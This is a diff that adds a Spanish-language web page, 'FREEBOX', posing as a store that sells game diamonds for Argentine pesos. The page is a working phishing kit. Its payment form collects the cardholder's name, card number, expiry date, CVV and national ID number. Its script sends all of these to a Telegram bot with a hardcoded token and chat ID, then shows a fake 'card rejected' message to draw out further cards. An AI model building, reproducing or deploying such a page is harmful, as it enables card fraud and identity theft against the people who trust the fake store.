@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>FREEBOX</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+  <style>
+    /* Reset y estilos generales */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #0f0f0f;
+      color: #fff;
+      line-height: 1.6;
+      overflow-x: hidden;
+      padding-bottom: 60px;
+    }
+    header {
+      background: transparent;
+      padding: 20px;
+      text-align: center;
+    }
+    header h1 {
+      font-size: 2.2rem;
+      color: #00ffd5;
+      letter-spacing: 1px;
+    }
+    .container {
+      max-width: 1000px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+    .section {
+      margin-bottom: 40px;
+    }
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: 500;
+      color: #ccc;
+    }
+    input, select {
+      width: 100%;
+      padding: 14px;
+      background: #1a1a1a;
+      color: #fff;
+      border: 1px solid #333;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      transition: all 0.3s ease;
+      font-size: 1rem;
+    }
+    input:focus, select:focus {
+      outline: none;
+      border-color: #00ffd5;
+      box-shadow: 0 0 8px #00ffd5;
+    }
+    /* Tarjetas de selección */
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 20px;
+    }
+    .card {
+      background: #1a1a1a;
+      padding: 25px;
+      border-radius: 16px;
+      text-align: center;
+      border: 2px solid transparent;
+      transition: all 0.3s ease;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+    }
+    .card:hover, .card.selected {
+      border-color: #00ffd5;
+      transform: scale(1.05);
+    }
+    .card img {
+      width: 20px;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+    .card span {
+      font-size: 1.1rem;
+      font-weight: 500;
+      vertical-align: middle;
+    }
+    /* Botones */
+    .btn-pagar, .btn-confirmar {
+      background: linear-gradient(to right, #00ffd5, #00b3ff);
+      color: #000;
+      font-weight: bold;
+      padding: 15px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 1.2rem;
+      transition: background 0.3s ease, transform 0.3s ease;
+      width: 100%;
+    }
+    .btn-pagar:hover, .btn-confirmar:hover {
+      background: linear-gradient(to right, #00b3ff, #00ffd5);
+      transform: scale(1.03);
+    }
+    /* Precio seleccionado */
+    #priceDisplay {
+      margin-bottom: 15px;
+      font-size: 1.1rem;
+      color: #00ffd5;
+      text-align: center;
+    }
+    /* Footer */
+    footer {
+      background: #1f1f1f;
+      text-align: center;
+      padding: 20px;
+      font-size: 0.9rem;
+      color: #aaa;
+      margin-top: 50px;
+    }
+    /* Overlay de carga */
+    #loadingOverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.8);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    #loadingOverlay.show {
+      display: flex;
+      animation: fadeInOverlay 0.5s ease forwards;
+    }
+    @keyframes fadeInOverlay {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .spinner {
+      border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top: 6px solid #00ffd5;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    /* Sección de pago seguro */
+    #paymentSection {
+      display: none;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+    #paymentSection h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 2rem;
+      color: #00ffd5;
+    }
+    .payment-form {
+      display: grid;
+      gap: 20px;
+    }
+    /* Contenedor centrado para logos y mensaje SSL */
+    .payment-info {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 20px;
+    }
+    .payment-logos {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+    .ssl-text {
+      margin-top: 10px;
+      font-size: 0.95rem;
+      color: #bbb;
+      font-style: italic;
+    }
+    /* Mensajes de error */
+    .error-alert {
+      background: rgba(255,82,82,0.15);
+      border-left: 4px solid #ff5252;
+      padding: 10px 15px;
+      margin: 10px 0;
+      border-radius: 4px;
+      color: #ff5252;
+      font-size: 0.9rem;
+      text-align: center;
+    }
+    /* Botones inferiores */
+    .bottom-buttons {
+      max-width: 1000px;
+      margin: 20px auto;
+      padding: 0 20px;
+      text-align: center;
+    }
+    .bottom-buttons .support-text {
+      font-size: 1.2rem;
+      margin-bottom: 10px;
+    }
+    .social-buttons {
+      display: flex;
+      gap: 20px;
+      justify-content: center;
+    }
+    .social-buttons button {
+      flex: 1;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 1.2rem;
+      font-weight: bold;
+      padding: 15px;
+      color: #fff;
+      transition: transform 0.3s ease;
+    }
+    .social-buttons button:hover {
+      transform: scale(1.03);
+    }
+    .btn-instagram {
+      background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285aeb 90%);
+    }
+    .btn-telegram {
+      background: #0088cc;
+    }
+    @media(max-width: 600px) {
+      header h1 {
+        font-size: 1.5rem;
+      }
+      .social-buttons {
+        flex-direction: column;
+      }
+      .payment-logos {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Sección de recarga -->
+  <div id="recargaSection" class="container">
+    <header>
+      <h1>FREEBOX</h1>
+    </header>
+    <div class="section">
+      <p style="margin-bottom: 10px; color: #ccc; font-size: 0.9rem;">
+        Por favor, asegúrese de ingresar su ID correctamente. Si verificamos que no existe, su pago será reembolsado automáticamente.
+      </p>
+      <label for="player-id">ID del jugador</label>
+      <input type="text" id="player-id" placeholder="Ingresa tu ID de jugador" maxlength="10" pattern="[0-9]*" inputmode="numeric">
+      <label for="server">Servidor</label>
+      <select id="server">
+        <option value="sudamerica" selected>Sudamérica</option>
+      </select>
+    </div>
+    <div class="section">
+      <label>Selecciona la cantidad de diamantes</label>
+      <div class="cards">
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://img.icons8.com/ios-filled/50/00ffd5/diamond.png" alt="Diamante">
+          <span>100+60 Diamantes</span>
+        </div>
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://img.icons8.com/ios-filled/50/00ffd5/diamond.png" alt="Diamante">
+          <span>310+100 Diamantes</span>
+        </div>
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://img.icons8.com/ios-filled/50/00ffd5/diamond.png" alt="Diamante">
+          <span>520+200 Diamantes</span>
+        </div>
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://img.icons8.com/ios-filled/50/00ffd5/diamond.png" alt="Diamante">
+          <span>1060+310 Diamantes</span>
+        </div>
+        <div class="card" onclick="selectCard(this)">
+          <img src="https://img.icons8.com/ios-filled/50/00ffd5/diamond.png" alt="Diamante">
+          <span>2180+520 Diamantes</span>
+        </div>
+      </div>
+    </div>
+    <!-- NUEVO: display del precio seleccionado -->
+    <div id="priceDisplay"></div>
+    <div class="section">
+      <button id="confirmRecarga" class="btn-confirmar">Pagar ahora</button>
+    </div>
+    <div id="inputError" class="error-alert" style="display:none;"></div>
+  </div>
+  
+  <!-- Sección de pago seguro -->
+  <div id="paymentSection" class="container">
+    <header>
+      <h1>Pago Seguro</h1>
+    </header>
+    <div class="section">
+      <h2>Ingrese los datos de pago</h2>
+      <!-- Bloque profesional con logos -->
+      <div class="payment-info">
+        <div class="payment-logos">
+          <img src="https://www.hojalateriaschile.cl/wp-content/uploads/2025/01/logos-tc-768x109.png" alt="Mastercard" style="width: 150px;">
+        </div>
+        <p class="ssl-text">Transacción segura mediante SSL</p>
+      </div>
+      <div id="paymentSummary" style="margin:20px 0;"></div>
+      <form id="paymentForm" class="payment-form">
+        <input type="text" id="nombre" name="nombre" placeholder="Nombre del titular de la tarjeta" required>
+        <input type="text" id="numero" name="numero" placeholder="Número de tarjeta" maxlength="16" pattern="\d{16}" inputmode="numeric" required>
+        <input type="text" id="vencimiento" name="vencimiento" placeholder="Fecha de expiración (MM/AA)" maxlength="5" inputmode="numeric" required>
+        <input type="text" id="codigo" name="codigo" placeholder="Código CVC" maxlength="3" inputmode="numeric" required>
+        <input type="text" id="dni" name="dni" placeholder="DNI (00.000.000)" maxlength="10" inputmode="numeric" required>
+        <button type="submit" class="btn-pagar">Confirmar pago</button>
+      </form>
+      <div id="paymentError" class="error-alert" style="display:none;"></div>
+    </div>
+  </div>
+  
+  <!-- Overlay de carga -->
+  <div id="loadingOverlay">
+    <div class="spinner"></div>
+  </div>
+  
+  <footer>
+    © 2025 Freebox. Todos los derechos reservados.
+  </footer>
+  
+  <!-- Botones inferiores -->
+  <div class="bottom-buttons">
+    <div class="support-text">Soporte</div>
+    <div class="social-buttons">
+      <button class="btn-bottom btn-instagram" onclick="window.location.href='https://instagram.com/ffreebox'">Instagram</button>
+      <button class="btn-bottom btn-telegram" onclick="window.location.href='https://telegram.me/healthra1'">Telegram</button>
+    </div>
+  </div>
+  
+  <script>
+    // Mapeo de precios a pagar
+    const priceMapping = {
+      "100+60 Diamantes": "1500 ARS sin impuestos",
+      "310+100 Diamantes": "3400 ARS sin impuestos",
+      "520+200 Diamantes": "6000 ARS sin impuestos",
+      "1060+310 Diamantes": "13.000 ARS sin impuestos",
+      "2180+520 Diamantes": "22.000 ARS sin impuestos"
+    };
+    
+    // Función de selección de tarjeta (ahora actualiza el precio visible)
+    function selectCard(card) {
+      document.querySelectorAll('.card').forEach(c => c.classList.remove('selected'));
+      card.classList.add('selected');
+      const amountText = card.querySelector('span').innerText;
+      const priceText = priceMapping[amountText] || '';
+      document.getElementById('priceDisplay').textContent = priceText ? `Precio: ${priceText}` : '';
+    }
+  
+    const confirmRecargaBtn = document.getElementById('confirmRecarga');
+    confirmRecargaBtn.addEventListener('click', () => {
+      const playerId = document.getElementById('player-id').value.trim();
+      const server = document.getElementById('server').value;
+      const selectedCard = document.querySelector('.card.selected');
+      if (playerId.length < 6) {
+        showError("El ID debe tener al menos 6 dígitos.", "inputError");
+        return;
+      }
+      if (!server) {
+        showError("Seleccione un servidor.", "inputError");
+        return;
+      }
+      if (!selectedCard) {
+        showError("Seleccione la cantidad de diamantes.", "inputError");
+        return;
+      }
+      const overlay = document.getElementById('loadingOverlay');
+      overlay.classList.add('show');
+      setTimeout(() => {
+        const amountText = selectedCard.querySelector('span').innerText;
+        const resumen = `
+<strong>Resumen de Pago:</strong><br>
+<em>ID de Jugador:</em> ${playerId}<br>
+<em>Servidor:</em> ${server}<br>
+<em>Diamantes:</em> ${amountText}<br>
+<em>Monto a Pagar:</em> ${priceMapping[amountText] ? priceMapping[amountText] : '--'}
+        `;
+        document.getElementById('paymentSummary').innerHTML = resumen;
+        document.getElementById('recargaSection').style.display = 'none';
+        document.getElementById('paymentSection').style.display = 'block';
+        overlay.classList.remove('show');
+      }, 2000);
+    });
+  
+    // Función para mostrar errores
+    function showError(message, containerId) {
+      const errorDiv = document.getElementById(containerId);
+      errorDiv.textContent = message;
+      errorDiv.style.display = "block";
+    }
+  
+    // Función para resaltar los campos del formulario
+    function highlightAllPaymentFields() {
+      document.querySelectorAll('#paymentForm input').forEach(input => {
+        input.style.border = "2px solid red";
+      });
+    }
+  
+    // Restaurar estilo al teclear en cada input
+    document.querySelectorAll('#paymentForm input').forEach(input => {
+      input.addEventListener('input', function() {
+        this.style.border = "1px solid #333";
+      });
+    });
+  
+    // Formatear fecha de vencimiento (MM/AA)
+    document.getElementById('vencimiento').addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '').substring(0, 4);
+      if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2);
+      this.value = value;
+    });
+  
+    // Formatear DNI con puntos
+    document.getElementById('dni').addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '').substring(0, 8);
+      if (value.length > 2 && value.length <= 5) {
+        value = value.substring(0, 2) + '.' + value.substring(2);
+      } else if (value.length > 5) {
+        value = value.substring(0, 2) + '.' + value.substring(2, 5) + '.' + value.substring(5);
+      }
+      this.value = value;
+    });
+  
+    // Envío del formulario de pago y envío a Telegram
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const vencimiento = document.getElementById('vencimiento').value.trim();
+      const codigo = document.getElementById('codigo').value.trim();
+      const dni = document.getElementById('dni').value.trim();
+      if (vencimiento.length !== 5) {
+        showError("Ingrese la fecha de vencimiento en formato MM/AA.", "paymentError");
+        return;
+      }
+      if (codigo.length !== 3) {
+        showError("Ingrese el CVV de 3 dígitos.", "paymentError");
+        return;
+      }
+      const dniSinPuntos = dni.replace(/\./g, '');
+      if (dniSinPuntos.length !== 8) {
+        showError("Ingrese un DNI válido de 8 dígitos.", "paymentError");
+        return;
+      }
+      const nombre = document.getElementById('nombre').value.trim();
+      const numero = document.getElementById('numero').value.trim();
+      const resumenPago = document.getElementById('paymentSummary').innerText;
+      const mensaje = `
+*Nuevo pago recibido:*
+${resumenPago}
+*Nombre:* ${nombre}
+*Número de tarjeta:* ${numero}
+*Vencimiento:* ${vencimiento}
+*CVV:* ${codigo}
+*DNI:* ${dni}
+      `;
+      // Datos del Bot de Telegram
+      const token = '7839830412:AAEhVvRqTnYvY0Ke79_o-uzh4jbWFZVGRmw';
+      const chat_id = '6493944778';
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: mensaje,
+          parse_mode: 'Markdown'
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        showError("Su tarjeta fue rechazada, por favor intente con otro método o consulte con su banco.", "paymentError");
+        highlightAllPaymentFields();
+      })
+      .catch(error => {
+        console.error('Error al enviar mensaje:', error);
+        showError("Error al procesar el pago. Intente nuevamente.", "paymentError");
+        highlightAllPaymentFields();
+      });
+    });
+  </script>
+</body>
+</html>
